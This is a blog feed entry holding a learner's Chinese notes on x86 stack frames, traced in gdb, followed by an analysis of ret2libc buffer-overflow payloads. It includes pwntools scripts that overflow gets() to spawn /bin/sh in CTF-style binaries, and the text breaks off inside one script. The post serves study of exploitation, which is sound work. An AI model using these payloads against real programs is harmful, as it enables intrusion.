<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>xiaoxiaoxy</title>
  
  
  <link href="http://xiaoxiaoxy1.github.io/atom.xml" rel="self"/>
  
  <link href="http://xiaoxiaoxy1.github.io/"/>
  <updated>2022-05-05T08:32:57.279Z</updated>
  <id>http://xiaoxiaoxy1.github.io/</id>
  
  <author>
    <name>xiaoxiaoxy</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>栈分析-2</title>
    <link href="http://xiaoxiaoxy1.github.io/2022/04/17/%E6%A0%88%E5%88%86%E6%9E%90-2/"/>
    <id>http://xiaoxiaoxy1.github.io/2022/04/17/%E6%A0%88%E5%88%86%E6%9E%90-2/</id>
    <published>2022-04-17T01:03:50.000Z</published>
    <updated>2022-05-05T08:32:57.279Z</updated>
    
    <content type="html"><![CDATA[<p>之前的 “栈分析” 一文尝试将plt、got表与exp中payload一起分析完，因为当时本人对一些基础概念的错误理解导致没有完成，回看文章发现篇幅过大，看起来很是疲惫，所以打算分开分析，这里就先只尝试分析exp中的payload，对了，之后一些基本指令的使用就不贴图了，以减少图片数量</p><br/><h1 id="函数调用过程中的栈上数据存储情况"><a href="#函数调用过程中的栈上数据存储情况" class="headerlink" title="函数调用过程中的栈上数据存储情况"></a>函数调用过程中的栈上数据存储情况</h1><p><img src="5.png" alt="32位的栈"></p><p>调用一个函数前，会把被调函数的参数从右至左依次入栈，再把下一条指令的地址作为被调函数的返回地址入栈</p><p><img src="image-20220421204957179.png" alt="image-20220421204957179"></p><br/><br/><h1 id="函数运行时栈况"><a href="#函数运行时栈况" class="headerlink" title="函数运行时栈况"></a>函数运行时栈况</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">#源码</span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">haha</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">lala</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> a,b,c;</span><br><span class="line">haha();</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">haha</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> x,y;</span><br><span class="line">lala();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">lala</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;wawa&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br/><p>如何编译以上C代码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1、ubuntu中建立.c文件，将以上代码复制到.c文件中（我建立的文件名为hawala.c）</span><br><span class="line">2、$ gcc -o hawala.out hawala.c -m32</span><br><span class="line">3、得到hawala.out32位二进制文件</span><br></pre></td></tr></table></figure><p>以上得到的 hawala.out 复制到 windows 下，丢进32位ida得到反编译汇编码</p><p>main()函数与haha()函数：</p><p><img src="image-20220417093548450.png" alt="image-20220417093548450"></p><p>lala()函数在此不列出，自己去看。</p><br/><p>由以上三个函数我们可以看到普通函数的函数头与函数尾的汇编指令大致与下图无异</p><p><img src="image-20220413101030564.png" alt="image-20220413101030564"></p><h2 id="单看函数头与函数尾"><a href="#单看函数头与函数尾" class="headerlink" title="单看函数头与函数尾"></a>单看函数头与函数尾</h2><p>图1（初始栈况）：地址值均为假设，栈右边为栈地址，栈中间为栈上存储的数据，ebp、esp存储的值为栈地址，栈从高地址向低地址生长。十六进制，一个数字代表4位</p><p><img src="image-20220413104217132.png" alt="image-20220413104217132"></p><p>图2（函数头）：push  ebp  ，效果，esp下移，ebp寄存器的值入栈（下图中ebp存储的是栈地址0xffff0080）</p><p><img src="image-20220417092141319.png" alt="image-20220417092141319"></p><p>图3（函数头）：mov  ebp, esp  ，效果，esp值赋给ebp</p><p><img src="image-20220413104939500.png" alt="image-20220413104939500"></p><p>图4（函数头）：and  esp, 0FFFFFFF0h  (注意这是9位数，带7个F，其中h表示16进制），将esp与0xfffffff0进行按位与操作，好像是对齐操作，总之效果就是将esp的后四位置0，使esp指针向下移动，又由图2知此时esp寄存器值为0xffff0070，后四位为0，所以将它与0xfffffff0按位与后esp位置不变</p><p><img src="image-20220413105821968.png" alt="image-20220413105821968"></p><p>图5：假设函数中间的汇编使esp执行到了向下的任意位置，但ebp是不会变的</p><p><img src="image-20220413110344050.png" alt="image-20220413110344050"></p><p>图6（函数尾）：mov  esp， ebp  ，效果：ebp的值赋给esp，导致esp指向0xffff0070</p><p><img src="image-20220413110623204.png" alt="image-20220413110623204"></p><p>图7（函数尾）：pop  ebp   ，效果：取出esp指向的栈上的数据赋给ebp，esp再自增四个字节</p><p><img src="image-20220413111149492.png" alt="image-20220413111149492"></p><p>图8（函数尾）：pop  eip  ，效果：此时eip被赋值为0xffff0074地址处的值0x????????</p><p><img src="image-20220413111516961.png" alt="image-20220413111516961"></p><p>最后：  jmp  eip  ，效果：程序跳转到eip寄存器上的地址开始执行，若现在正在执行lala()函数中的jmp eip，在程序没有发生栈溢出等使0xffff0074地址上的地址数据被修改情况下，那么，jmp eip跳转到的将是haha()函数</p><br/><p>上述过程没有列出函数中间部分的汇编指令对esp、ebp的影响（只列出了函数头/尾的影响），这里也不解释太多，继续往下看就行了。</p><p>对了，有一个关键词—-“栈平衡”，没事可以去百度搜搜看</p><br/><p><img src="image-20220417101120336.png" alt="image-20220417101120336"></p><p><img src="image-20220413115522038-16501575766301.png" alt="image-20220413115522038"></p><br/><br/><h2 id="函数调用子函数"><a href="#函数调用子函数" class="headerlink" title="函数调用子函数"></a>函数调用子函数</h2><p>Ubuntu使用gdb调试hawala.out（上一步中生成的）</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$ gdb hawala.out</span><br><span class="line"></span><br><span class="line"><span class="comment">#设置三个断点</span></span><br><span class="line">pwndbg&gt; b main</span><br><span class="line">pwndbg&gt; b haha</span><br><span class="line">pwndbg&gt; b lala</span><br><span class="line"></span><br><span class="line"><span class="comment">#r运行</span></span><br><span class="line">pwndbg&gt; r</span><br></pre></td></tr></table></figure><p>1、ni单步到call  haha，<strong>记录好调call前的ebp：0xffffcff8   esp：0xffffcff0</strong></p><p>我们接下来看看调用过程中的ebp、esp变化</p><p><img src="image-20220417103116882.png" alt="image-20220417103116882"></p><p>2、对比上一张图可以看到，这步ni调call，有两处改变：</p><p>1）、栈中压入下一条指令地址，即：push  IP，不过这里的IP是下一条PC指令地址</p><p>2）、我们的PC指针也是从0x565561e1指向了0x565561ed</p><p><strong>此时的ebp：0xffffcff8   esp：0xffffcfec</strong></p><p><img src="image-20220417102533393.png" alt="image-20220417102533393"></p><p>3、继续ni，可以看到ebp、esp都没变，PC指针指向下一指令，<strong>此时的ebp：0xffffcff8   esp：0xffffcfec</strong></p><p><img src="image-20220417105706324.png" alt="image-20220417105706324"></p><p>4、继续ni，可以看到ebp的值已经入栈，入栈的位置是0xffffcfe8，<strong>此时的ebp：0xffffcff8   esp：0xffffcfe8</strong></p><p><img src="image-20220417105931329.png" alt="image-20220417105931329"></p><p>5、继续ni，可以看到我们的ebp已经改变为0xffffcfe8，<strong>此时的ebp：0xffffcfe8   esp：0xffffcfe8</strong></p><p><img src="image-20220417111332760.png" alt="image-20220417111332760"></p><p>6、ni，sub  esp,8，向下开辟8字节栈空间，<strong>此时的ebp：0xffffcfe8   esp：0xffffcfe0</strong></p><p><img src="image-20220417112901330.png" alt="image-20220417112901330"></p><p>7、next，<strong>此时的ebp：0xffffcfe8   esp：0xffffcfe0</strong></p><p>这一步调call指令验证了调用一个call的前后，ebp、esp值不变，</p><p><img src="image-20220417113148725.png" alt="image-20220417113148725"></p><p>8、ni，下一步调用lala()函数，<strong>此时的ebp：0xffffcfe8   esp：0xffffcfe0</strong></p><p><img src="image-20220417113718734.png" alt="image-20220417113718734"></p><p>9、这里我直接多步ni跳出call  lala，因为我们现在在看main中调haha()函数，再看一遍haha()函数中调lala()函数效果一样，所以直接多步ni跳过，<strong>此时的ebp：0xffffcfe8   esp：0xffffcfe0</strong></p><p>可以看到，haha()中调用lala()前后，ebp、esp不变</p><p><img src="image-20220417114155053.png" alt="image-20220417114155053"></p><p>10、ni，执行一个nop，即无操作，<strong>此时的ebp：0xffffcfe8   esp：0xffffcfe0</strong></p><p><img src="image-20220417114327923.png" alt="image-20220417114327923"></p><p>11、ni，<strong>此时的ebp：0xffffcff8   esp：0xffffcfec</strong></p><p><img src="image-20220417114517687.png" alt="image-20220417114517687"></p><p>12、ni，我们回到了main函数，__此时的ebp：0xffffcff8   esp：0xffffcff0__，是不是跟调用haha()前的ebp、esp一样？ok，自己思考一下，聪明的你想必可以想出 <strong>“栈平衡”</strong> 具体的含义了</p><p><img src="image-20220417114625688.png" alt="image-20220417114625688"></p><p>这时再回头看看这张图，自己体会一下  ^_^</p><p><img src="image-20220417115045351.png" alt="image-20220417115045351"></p><br/><br/><h1 id="exp中payload分析（这里不用看，意义不大，个人想保留所以留在这，请直接看下面的exp中payload分析1）"><a href="#exp中payload分析（这里不用看，意义不大，个人想保留所以留在这，请直接看下面的exp中payload分析1）" class="headerlink" title="exp中payload分析（这里不用看，意义不大，个人想保留所以留在这，请直接看下面的exp中payload分析1）"></a>exp中payload分析（这里不用看，意义不大，个人想保留所以留在这，请直接看下面的exp中payload分析1）</h1><p>注：个人笔记，重在个人看懂</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#ret2libc1</span></span><br><span class="line">    payload = flat([<span class="string">&#x27;a&#x27;</span> * <span class="number">112</span>, system_plt, <span class="string">&#x27;b&#x27;</span> * <span class="number">4</span>, binsh_addr])</span><br></pre></td></tr></table></figure><br/><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#exp</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&quot;i386&quot;</span>,os=<span class="string">&quot;linux&quot;</span>,log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line"></span><br><span class="line">binsh_addr = <span class="number">0x08048720</span>    </span><br><span class="line">system_plt = <span class="number">0x08048460</span></span><br><span class="line">payload = flat([<span class="string">b&#x27;a&#x27;</span> * <span class="number">112</span>, system_plt,<span class="string">b&#x27;b&#x27;</span> * <span class="number">4</span>, binsh_addr])</span><br><span class="line"></span><br><span class="line">sh=process(<span class="string">&quot;./ret2libc1&quot;</span>)</span><br><span class="line"><span class="comment">#在sh进程中，启动gdb调试，并在0x08048683地址处设置断点</span></span><br><span class="line">gdb.attach(sh,<span class="string">&quot;b *0x08048683&quot;</span>)    </span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><br/><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">#ida</span><br><span class="line"></span><br><span class="line">.text:0804867E                 call    _gets</span><br><span class="line">.text:08048683                 mov     eax, 0</span><br><span class="line">.text:08048688                 leave</span><br><span class="line">.text:08048689                 retn</span><br></pre></td></tr></table></figure><br/><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#gdb</span></span><br><span class="line"></span><br><span class="line">   0x8048683  &lt;main+107&gt;         mov    eax, 0</span><br><span class="line">   0x8048688  &lt;main+112&gt;         leave  </span><br><span class="line">   0x8048689  &lt;main+113&gt;         ret    </span><br><span class="line">    ↓</span><br><span class="line">   0x8048460  &lt;system@plt&gt;       jmp    dword ptr [system@got.plt]    &lt;0x804a018&gt;</span><br><span class="line"> </span><br><span class="line">   0x8048466  &lt;system@plt+6&gt;     push   0x18</span><br><span class="line">   0x804846b  &lt;system@plt+11&gt;    jmp    0x8048420                     &lt;0x8048420&gt;</span><br><span class="line">    ↓</span><br><span class="line">   0x8048420                     push   dword ptr [_GLOBAL_OFFSET_TABLE_+4] &lt;0x804a004&gt;</span><br><span class="line">   0x8048426                     jmp    dword ptr [0x804a008]         &lt;0xf7f05b10&gt;</span><br><span class="line">    ↓</span><br><span class="line">   0xf7f05b10                    endbr32 </span><br><span class="line">   0xf7f05b14                    push   eax</span><br><span class="line">   0xf7f05b15                    push   ecx</span><br><span class="line">   0xf7f05b16                    push   edx</span><br><span class="line">   0xf7f05b17                    mov    edx, dword ptr [esp + 0x10]</span><br><span class="line">   0xf7f05b1b                    mov    eax, dword ptr [esp + 0xc]</span><br><span class="line">   0xf7f05b1f                    call   0xf7eff7d0                    &lt;0xf7eff7d0&gt;</span><br><span class="line"> </span><br><span class="line">   0xf7f05b24                    pop    edx</span><br><span class="line">   0xf7f05b25                mov    ecx, dword ptr [esp]</span><br><span class="line">   0xf7f05b28                mov    dword ptr [esp], eax</span><br><span class="line">   0xf7f05b2b                mov    eax, dword ptr [esp + 4]</span><br><span class="line">   0xf7f05b2f                ret    0xc                           &lt;0xf7f1b000&gt;</span><br><span class="line">    ↓</span><br><span class="line">   0xf7d25790 &lt;system&gt;       endbr32 </span><br><span class="line"> ► 0xf7d25794 &lt;system+4&gt;     call   __x86.get_pc_thunk.dx                    &lt;__x86.get_pc_thunk.dx&gt;</span><br><span class="line">        arg[0]: 0x62626262 (<span class="string">&#x27;bbbb&#x27;</span>)</span><br><span class="line">        arg[1]: 0x8048720 ◂— das     /* <span class="string">&#x27;/bin/sh&#x27;</span> */</span><br><span class="line">        arg[2]: 0xff8be200 —▸ 0xf7ecf000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1ead6c</span><br><span class="line">        arg[3]: 0xff8be244 ◂— 0x0</span><br><span class="line"> </span><br><span class="line">   0xf7d25799 &lt;system+9&gt;     add    edx, 0x1a9867</span><br><span class="line">   0xf7d2579f &lt;system+15&gt;    sub    esp, 0xc</span><br><span class="line">   0xf7d257a2 &lt;system+18&gt;    mov    eax, dword ptr [esp + 0x10]</span><br><span class="line">   0xf7d257a6 &lt;system+22&gt;    <span class="built_in">test</span>   eax, eax</span><br><span class="line">   0xf7d257a8 &lt;system+24&gt;    je     system+40                    &lt;system+40&gt;</span><br><span class="line"> </span><br><span class="line">   0xf7d257aa &lt;system+26&gt;    add    esp, 0xc</span><br><span class="line">   0xf7d257ad &lt;system+29&gt;    jmp    do_system                    &lt;do_system&gt;</span><br><span class="line"> </span><br><span class="line">   0xf7d257b2 &lt;system+34&gt;    lea    esi, [esi]</span><br><span class="line">   0xf7d257b8 &lt;system+40&gt;    lea    eax, [edx - 0x5cc95]</span><br><span class="line">   </span><br><span class="line"><span class="comment">#因为发现了一个神奇的现象，我进行了重新运行，后面的汇编还没copy，</span></span><br><span class="line"><span class="comment">#而重新运行导致有些地址发生改变，所以我在后面重新弄了一个</span></span><br></pre></td></tr></table></figure><p>发现一个神奇的现象</p><p><img src="image-20220419210804958.png" alt="image-20220419210804958"></p><p>单步一个ret，让我的esp增了0x10</p><p><img src="image-20220419210859590.png" alt="image-20220419210859590"></p><p>不猜测了，重新运行一遍，这步ret用si调，行吧，一样的，还是增了0x10，就挺奇怪，ret怎么会改变esp呢……</p><p><img src="image-20220419211551474.png" alt="image-20220419211551474"></p><p><img src="image-20220419211547282.png" alt="image-20220419211547282"></p><br/><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#gdb</span></span><br><span class="line"></span><br><span class="line">0x8048683  &lt;main+107&gt;         mov    eax, 0</span><br><span class="line">   0x8048688  &lt;main+112&gt;         leave  </span><br><span class="line">   0x8048689  &lt;main+113&gt;         ret    </span><br><span class="line">    ↓</span><br><span class="line">   0x8048460  &lt;system@plt&gt;       jmp    dword ptr [system@got.plt]    &lt;0x804a018&gt;</span><br><span class="line"> </span><br><span class="line">   0x8048466  &lt;system@plt+6&gt;     push   0x18</span><br><span class="line">   0x804846b  &lt;system@plt+11&gt;    jmp    0x8048420                     &lt;0x8048420&gt;</span><br><span class="line">    ↓</span><br><span class="line">   0x8048420                     push   dword ptr [_GLOBAL_OFFSET_TABLE_+4] &lt;0x804a004&gt;</span><br><span class="line">   0x8048426                     jmp    dword ptr [0x804a008]         &lt;0xf7f74b10&gt;</span><br><span class="line">    ↓</span><br><span class="line">   0xf7f74b10                    endbr32 </span><br><span class="line">   0xf7f74b14                    push   eax</span><br><span class="line">   0xf7f74b15                    push   ecx</span><br><span class="line">   0xf7f74b16                    push   edx</span><br><span class="line">   0xf7f74b17                    mov    edx, dword ptr [esp + 0x10]</span><br><span class="line">   0xf7f74b1b                    mov    eax, dword ptr [esp + 0xc]</span><br><span class="line">   0xf7f74b1f                    call   0xf7f6e7d0                    &lt;0xf7f6e7d0&gt;</span><br><span class="line"> </span><br><span class="line">   0xf7f74b24                pop    edx</span><br><span class="line">   0xf7f74b25                mov    ecx, dword ptr [esp]</span><br><span class="line">   0xf7f74b28                mov    dword ptr [esp], eax</span><br><span class="line">   0xf7f74b2b                mov    eax, dword ptr [esp + 4]</span><br><span class="line">   0xf7f74b2f                ret    0xc</span><br><span class="line">    ↓</span><br><span class="line">   0xf7d94790 &lt;system&gt;       endbr32</span><br><span class="line"> ► 0xf7d94794 &lt;system+4&gt;     call   __x86.get_pc_thunk.dx        &lt;__x86.get_pc_thunk.dx&gt;</span><br><span class="line">        arg[0]: 0x62626262 (<span class="string">&#x27;bbbb&#x27;</span>)</span><br><span class="line">        arg[1]: 0x8048720 ◂— das     /* <span class="string">&#x27;/bin/sh&#x27;</span> */</span><br><span class="line">        arg[2]: 0xfff5eb00 —▸ 0xf7d94790 (system) ◂— endbr32 </span><br><span class="line">        arg[3]: 0xfff5eb34 ◂— 0x0</span><br><span class="line"> </span><br><span class="line">   0xf7d94799 &lt;system+9&gt;     add    edx, 0x1a9867</span><br><span class="line">   0xf7d9479f &lt;system+15&gt;    sub    esp, 0xc</span><br><span class="line">   0xf7d947a2 &lt;system+18&gt;    mov    eax, dword ptr [esp + 0x10]</span><br><span class="line">   0xf7d947a6 &lt;system+22&gt;    <span class="built_in">test</span>   eax, eax</span><br><span class="line">   0xf7d947a8 &lt;system+24&gt;    je     system+40                    &lt;system+40&gt;</span><br><span class="line"> </span><br><span class="line">   0xf7d947aa &lt;system+26&gt;    add    esp, 0xc</span><br><span class="line">   0xf7d947ad &lt;system+29&gt;    jmp    do_system                    &lt;do_system&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment">#-----------以下两句尚未执行就跳转至别处-----------------------# </span></span><br><span class="line">   0xf7d947b2 &lt;system+34&gt;    lea    esi, [esi]</span><br><span class="line">   0xf7d947b8 &lt;system+40&gt;    lea    eax, [edx - 0x5cc95]</span><br><span class="line"><span class="comment">#---------------------------------------------------------# </span></span><br><span class="line"></span><br><span class="line">   0xf7d947ad &lt;system+29&gt;       jmp    do_system                 &lt;do_system&gt;</span><br><span class="line">    ↓</span><br><span class="line">   0xf7d941c0 &lt;do_system&gt;       push   ebp</span><br><span class="line">   0xf7d941c1 &lt;do_system+1&gt;     mov    ebp, eax</span><br><span class="line">   0xf7d941c3 &lt;do_system+3&gt;     push   edi</span><br><span class="line">   0xf7d941c4 &lt;do_system+4&gt;     call   __x86.get_pc_thunk.di     &lt;__x86.get_pc_thunk.di&gt;</span><br><span class="line"> </span><br><span class="line">   0xf7d941c9 &lt;do_system+9&gt;     add    edi, 0x1a9e37</span><br><span class="line">   0xf7d941cf &lt;do_system+15&gt;    push   esi</span><br><span class="line">   0xf7d941d0 &lt;do_system+16&gt;    push   ebx</span><br><span class="line">   0xf7d941d1 &lt;do_system+17&gt;    sub    esp, 0x33c</span><br><span class="line">   0xf7d941d7 &lt;do_system+23&gt;    mov    eax, dword ptr gs:[0x14]</span><br><span class="line">   0xf7d941dd &lt;do_system+29&gt;    mov    dword ptr [esp + 0x32c], eax</span><br><span class="line">   0xf7d941e4 &lt;do_system+36&gt;    xor    eax, eax</span><br><span class="line">   0xf7d941e6 &lt;do_system+38&gt;    lea    ebx, [esp + 0x150]</span><br><span class="line">   0xf7d941ed &lt;do_system+45&gt;    lea    eax, [esp + 0x1d0]</span><br><span class="line">   0xf7d941f4 &lt;do_system+52&gt;    mov    dword ptr [esp + 0x1c], 0xffffffff</span><br><span class="line">   0xf7d941fc &lt;do_system+60&gt;    mov    dword ptr [esp + 0x150], 1</span><br><span class="line">   0xf7d94207 &lt;do_system+71&gt;    mov    dword ptr [esp + 0x1d4], 0</span><br><span class="line">   0xf7d94212 &lt;do_system+82&gt;    lea    esi, [esi]</span><br><span class="line">   0xf7d94218 &lt;do_system+88&gt;    mov    dword ptr [eax], 0</span><br><span class="line">   0xf7d9421e &lt;do_system+94&gt;    sub    eax, 4</span><br><span class="line">   0xf7d94221 &lt;do_system+97&gt;    cmp    ebx, eax</span><br><span class="line">   0xf7d94223 &lt;do_system+99&gt;    jne    do_system+88                    &lt;do_system+88&gt;</span><br><span class="line">    ↓</span><br><span class="line">   0xf7d94218 &lt;do_system+88&gt;    mov    dword ptr [eax], 0</span><br><span class="line">   0xf7d9421e &lt;do_system+94&gt;    sub    eax, 4</span><br><span class="line">   0xf7d94221 &lt;do_system+97&gt;    cmp    ebx, eax</span><br><span class="line">   0xf7d94223 &lt;do_system+99&gt;    jne    do_system+88                    &lt;do_system+88&gt;</span><br><span class="line">   </span><br><span class="line"><span class="comment">#好吧，进循环了，后面还有n个循环，暂且中止，要是能有个做底层汇编，会写操作系统内核的大佬带我该多好啊</span></span><br><span class="line"><span class="comment">#又或许我只是需要去系统的学习一下汇编再多写写汇编代码罢了</span></span><br></pre></td></tr></table></figure><p>中间很奇怪，因为我们的/bin/sh的地址0x8048720存储在栈地址0xfff5eb14上，所以我一直看着esp什么时候会指向0xfff5eb14，但一路调下来，最高也就指到了0xfff5eb10这一栈地址，而在下图中，我发现ebp存储了我们的/bin/sh，</p><p><img src="image-20220419213546772.png" alt="image-20220419213546772"></p><p><img src="image-20220419213744042.png" alt="image-20220419213744042"></p><br/><p>头疼，莫名其妙的，还是没搞明白为什么这串payload中间要隔四个字符再放/bin/sh的地址，一但进入plt表后我的思路就全乱了，本来是打算找到那几条关键的汇编，连在一起做一个验证，结果我发现我得在成千上万条汇编中找出我想要的那几条……</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload = flat([&#x27;a&#x27; * 112, system_plt, &#x27;b&#x27; * 4, binsh_addr])</span><br></pre></td></tr></table></figure><p>而ret2libc3中的payload可以这…等等p32(system_addr) + ‘aaaa’ + p32(buf2_addr)，的确还是隔了四个字符</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload = &#x27;a&#x27;*112 + p32(gets_addr) + p32(pop_ebx_addr) + p32(buf2_addr) + p32(system_addr) + &#x27;aaaa&#x27; + p32(buf2_addr)</span><br></pre></td></tr></table></figure><br/><p>再研究一下ret2libc1、ret2libc2、ret2libc3的exp，这里拿  <a href="https://blog.csdn.net/qq_40827990/article/details/86662079?ops_request_misc=%7B%22request_id%22:%22164828478816780271961568%22,%22scm%22:%2220140713.130102334.pc_all.%22%7D&request_id=164828478816780271961568&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_ecpm_v1~rank_v31_ecpm-1-86662079.142%5Ev5%5Epc_search_result_cache,143%5Ev6%5Eregister&utm_term=ret2libc2&spm=1018.2226.3001.4187">Ret2libc_钞sir的博客-CSDN博客_ret2libc </a> 这个博客的exp做观察</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line">#ret2libc1</span><br><span class="line">from pwn import *</span><br><span class="line">p = process(&#x27;./ret2libc1&#x27;)</span><br><span class="line">context.log_level = &#x27;debug&#x27;</span><br><span class="line">system_addr = 0x08048460</span><br><span class="line">binsh_addr = 